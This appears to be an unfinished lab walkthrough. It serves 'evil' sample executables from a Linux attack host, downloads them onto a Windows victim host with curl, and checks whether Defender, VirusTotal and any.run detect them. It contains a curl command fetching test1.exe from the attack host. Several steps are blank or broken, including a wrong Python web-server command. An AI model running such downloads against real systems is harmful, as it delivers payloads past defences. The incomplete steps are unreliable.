# Detection

## Host the "evil" files.

1. First record your IP address on the eth0 interface. `ip addr`
2. Now change directory into the notransomware directory.
3. Run the following command to serve the files for download.
`python3 -m httpserver`

## Download the "evil" files.

1. Switch to the "WIN-VICTIM-HOST-#" by pressing ctrl+shift+alt.
2. Do some pre-flight checks, you can access all the required programs by clicking the search bar in the bottom left and typing their respective names. When they appear in the start menu results, double click them.
- Is a folder on the desktop called? (If not, launch a command prompt and run `git clone `)
- Is firefox installed? (If not, launch a command prompt and run `choco install firefox`)
3. Open a command prompt. 
4. Run the following command with my new favorite living off the land binary for dowloading remote files. 
`curl http://172.31.24.<last octet of your linux attack host>:8000/test1.exe -o test1.exe`
5. Once you have this worked out, download all theo ther files you created on the linux attack host just changing the file names.
6. This is your first detection example...no alerts from windows defender.

## What does virust total have to say about all this?

1. Open firefox and browse to virus total.  www.virustotal.com
2. 

curl http://172.31.24.###:8000/test1.exe -o test1.exe

Open firefox browse to virustotal and upload



## compile the code

1. In vscode's terminal
2. Run this command to compile into an executable binary.
3. upload sample to virus total.
4. upload to any.run
5. upload anywhere else you like and analyze detections or lack there of

